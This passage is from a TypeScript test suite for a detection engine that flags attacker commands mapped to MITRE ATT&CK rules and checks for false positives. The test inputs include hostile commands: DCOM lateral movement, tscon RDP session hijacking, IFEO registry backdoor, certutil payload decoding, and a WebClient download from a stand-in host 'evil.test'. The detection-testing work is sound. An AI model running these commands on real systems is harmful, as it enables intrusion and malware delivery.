		expect(matchCommand(engine, "Invoke-DCOM -ComputerName DC01")).toContain("CLT-MITRE-014");
	});

	it("does not match a prose mention of Invoke-DCOM -ComputerName (MITRE-014 FP)", () => {
		const ids = matchCommand(engine, 'echo "Invoke-DCOM -ComputerName is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-014")).toEqual([]);
	});

	it("detects RDP session hijacking (MITRE-096)", () => {
		expect(matchCommand(engine, "tscon 2 /dest:rdp-tcp#0")).toContain("CLT-MITRE-096");
	});

	it("detects RDP hijacking via tscon.exe path (MITRE-096)", () => {
		expect(matchCommand(engine, "C:\\Windows\\System32\\tscon.exe 2 /dest:console")).toContain(
			"CLT-MITRE-096",
		);
	});

	it("does not match a bare fully-quoted tscon.exe path with no wrapper (MITRE-096)", () => {
		// {{CMD_POS}} doesn't admit a leading quote outside a dispatch context
		// (bash -c "...", cmd /c "...") -- same accepted gap as every other
		// {{CMD_POS}} rule (CLT-CMD-009, CLT-WIN-CMD-022/036 have no equivalent
		// bare-quoted-whole-command-line test either).
		const ids = matchCommand(engine, '"C:\\Windows\\System32\\tscon.exe" 2 /dest:console');
		expect(ids.filter((id) => id === "CLT-MITRE-096")).toEqual([]);
	});

	it("does not match tsconfig file paths (MITRE-096)", () => {
		const ids = matchCommand(engine, "npx tsc --noEmit --project packages/core/tsconfig.json");
		expect(ids.filter((id) => id === "CLT-MITRE-096")).toEqual([]);
	});

	it("does not match tscon in argument position (MITRE-096 FP)", () => {
		const ids = matchCommand(engine, "where tscon.exe && echo found");
		expect(ids.filter((id) => id === "CLT-MITRE-096")).toEqual([]);
	});

	it("does not match a grep for tscon (MITRE-096 FP)", () => {
		const ids = matchCommand(engine, "grep -rn tscon threats/");
		expect(ids.filter((id) => id === "CLT-MITRE-096")).toEqual([]);
	});

	it("does not match copying a tscon.exe file (MITRE-096 FP)", () => {
		const ids = matchCommand(engine, "copy C:\\tools\\tscon.exe D:\\backup\\");
		expect(ids.filter((id) => id === "CLT-MITRE-096")).toEqual([]);
	});

	it("does not match findstr for tscon (MITRE-096 FP)", () => {
		const ids = matchCommand(engine, "findstr tscon session.log");
		expect(ids.filter((id) => id === "CLT-MITRE-096")).toEqual([]);
	});

	it("does not match a quoted mention of tscon.exe (MITRE-096 FP)", () => {
		const ids = matchCommand(engine, 'echo "use tscon.exe 3 /dest:console to hijack"');
		expect(ids.filter((id) => id === "CLT-MITRE-096")).toEqual([]);
	});

	// --- Privilege Escalation ---

	it("detects IFEO injection (MITRE-078)", () => {
		expect(matchCommand(engine, "Add-RegBackdoor.ps1")).toContain("CLT-MITRE-078");
	});

	it("does not match a prose mention of Add-RegBackdoor.ps1 (MITRE-078 FP)", () => {
		const ids = matchCommand(engine, 'echo "Add-RegBackdoor.ps1 is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-078")).toEqual([]);
	});

	// --- Collection ---

	it("detects archive collection (MITRE-092)", () => {
		expect(matchCommand(engine, "7z a -p archive.7z sensitive/")).toContain("CLT-MITRE-092");
	});

	it("does not match archive collection on extract (MITRE-092)", () => {
		const ids = matchCommand(engine, "7z x archive.7z");
		expect(ids.filter((id) => id === "CLT-MITRE-092")).toEqual([]);
	});

	it("does not match a prose mention of 7z a archive.7z (MITRE-092 FP)", () => {
		const ids = matchCommand(engine, 'echo "7z a archive.7z is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-092")).toEqual([]);
	});

	// --- Command & Control ---

	it("detects tool transfer via certutil (MITRE-041)", () => {
		expect(matchCommand(engine, "certutil -decode payload.b64 evil.exe")).toContain(
			"CLT-MITRE-041",
		);
	});

	it("does not match tool transfer on certutil verify (MITRE-041)", () => {
		const ids = matchCommand(engine, "certutil -verify cert.pem");
		expect(ids.filter((id) => id === "CLT-MITRE-041")).toEqual([]);
	});

	it("detects tool transfer via New-Object WebClient (MITRE-041)", () => {
		expect(
			matchCommand(
				engine,
				"(New-Object System.Net.WebClient).DownloadFile('http://evil.test/f.exe','f.exe')",
			),
		).toContain("CLT-MITRE-041");
	});
});
